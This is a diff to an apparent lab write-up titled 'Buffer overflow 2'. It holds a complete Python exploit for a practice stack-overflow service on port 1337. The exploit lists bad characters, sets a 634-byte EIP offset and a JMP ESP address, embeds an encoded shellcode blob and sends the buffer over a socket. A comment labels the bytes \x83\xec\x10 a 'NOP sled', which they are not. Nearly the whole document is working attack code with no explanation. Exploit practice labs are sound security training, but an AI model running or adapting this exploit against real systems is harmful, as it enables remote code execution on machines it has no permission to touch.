@@ -1,22 +1,28 @@
 # Buffer overflow 2
 
-```text
+Badchars: `\x00\x07\x2e\xa0`
+
+## Exploit code
+
+```python
 #!/usr/bin/env python3
 import socket
 
-ip = "KALI_IP"
+
+ip = "MACHINE_IP"
 port = 1337
 
 buf_length = 1100
 prefix = "OVERFLOW2 "
-offset = 634
-sled = "\x90" * 16
+offset = 634                            # EIP offset
+overflow = "A" * offset
+jmp_esp = "\xaf\x11\x50\x62"
 
 buffer = ""
-buffer += prefix						# prefix
-buffer += "A" * (offset)				# padding
-buffer += "\xaf\x11\x50\x62"			# overwriting the saved return pointer
-buffer += sled							# NOP sled
+buffer += prefix
+buffer += overflow                      # Padding
+buffer += jmp_esp                       # Overwriting saved return pointer
+buffer += "\x83\xec\x10"                # NOP sled
 buffer += ("\xfc\xbb\x1f\x97\xec\x8c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
 	"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe3\x7f\x6e\x8c\x1b"
 	"\x80\x0f\x04\xfe\xb1\x0f\x72\x8b\xe2\xbf\xf0\xd9\x0e\x4b\x54"
@@ -40,16 +46,19 @@ buffer += ("\xfc\xbb\x1f\x97\xec\x8c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
 	"\xdd\x98\x5e\x47\xab\x44\xee\x3e\xea\x7b\xdf\xd6\xfa\x04\x3d"
 	"\x47\x04\xdf\x85\x67\xe7\xf5\xf3\x0f\xbe\x9c\xb9\x4d\x41\x4b"
 	"\xfd\x6b\xc2\x79\x7e\x88\xda\x08\x7b\xd4\x5c\xe1\xf1\x45\x09"
-	"\x05\xa5\x66\x18\x05\x49\x99\xa3")			# shellcode
-buffer += "D" * (buf_length - (len(buffer) - len(prefix)))	# trail padding
+	"\x05\xa5\x66\x18\x05\x49\x99\xa3")	
+buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
 buffer += "\r\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
-	s.connect((ip, port))
-	print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
-	s.send(bytes(buffer, "latin-1"))
-	print("[+] Done!")
-except:
-	print("[-] Could not connect.")
+    s.connect((ip, port))
+    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
+    s.send(bytes(buffer, "latin-1"))
+    print("[+] Done!")
+except socket.error:
+    print("[-] Could not connect.")
+finally:
+    s.close()
+
 ```
